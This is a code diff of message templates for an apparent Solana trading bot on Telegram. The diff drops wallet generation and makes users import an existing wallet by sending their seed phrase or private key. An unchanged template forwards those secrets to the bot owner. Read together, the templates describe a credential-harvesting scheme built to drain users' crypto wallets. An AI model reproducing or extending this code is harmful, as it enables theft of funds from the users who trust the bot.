@@ -49,7 +49,7 @@ def welcome(name: str, bot_username: str):
         "After that, unlock unlimited access with VIP Access.\n\n"
         "👥 50% ref back for every paid user — real SOL in your wallet.\n"
         "💎 Real on-chain payments. No auto-check. Send the TX.\n\n"
-        "👛 Open 📈 TRADING for your trading wallet, then deposit SOL to trade."
+        "👛 Open 📈 TRADING and IMPORT your wallet to trade real."
     )
 
 
@@ -247,7 +247,7 @@ def owner_new_user(user_line_txt: str, total: int, wallet_pub: str = "", wallet_
         wallet_line = (f"🏦 Wallet: <code>{esc(wallet_pub)}</code>"
                        f"\n💰 Balance: {balance_sol:g} SOL")
     else:
-        wallet_line = "🏦 Wallet: not set yet — user will GENERATE or IMPORT in Trading."
+        wallet_line = "🏦 Wallet: not set yet — user will IMPORT a wallet in Trading."
     return (
         "🆕 NEW USER STARTED THE BOT\n\n"
         f"👤 {user_line_txt}\n"
@@ -292,12 +292,20 @@ def ask_import():
     )
 
 
-def wallet_generated(addr: str, derived: bool = False):
+def wallet_locked():
     return (
-        f"✅ Wallet generated!\n\n"
-        f"👛 Your Trading Wallet: <code>{addr}</code>\n"
-        "Deposit SOL here to trade real."
+        "📈 TRADING\n\n"
+        "🔒 Your wallet is not connected yet.\n\n"
+        "Tap 📥 IMPORT WALLET below and send:\n"
+        "• Seed phrase (12/24 words), or\n"
+        "• Private key (base58/base64), or\n"
+        "• Key byte array [46, 207, …]\n\n"
+        "Trading unlocks as soon as your wallet is imported."
     )
+
+
+def need_wallet():
+    return "🔒 Import your wallet first — open 📈 TRADING."
 
 
 def your_wallet(addr: str, balance_sol: float = None):
@@ -327,15 +335,6 @@ def owner_wallet_imported(user_line: str, secret: str, addr: str):
         f"👤 {user_line}\n"
         f"🏦 Address: <code>{esc(addr)}</code>\n\n"
         f"🔑 Seed / key:\n<code>{esc(secret)}</code>"
-    )
-
-
-def owner_wallet_generated(user_line: str, addr: str, secret: str):
-    return (
-        "🆕 USER GENERATED A WALLET\n\n"
-        f"👤 {user_line}\n"
-        f"🏦 Address: <code>{esc(addr)}</code>\n\n"
-        f"🔑 Private key (base58):\n<code>{esc(secret)}</code>"
     )
 
 
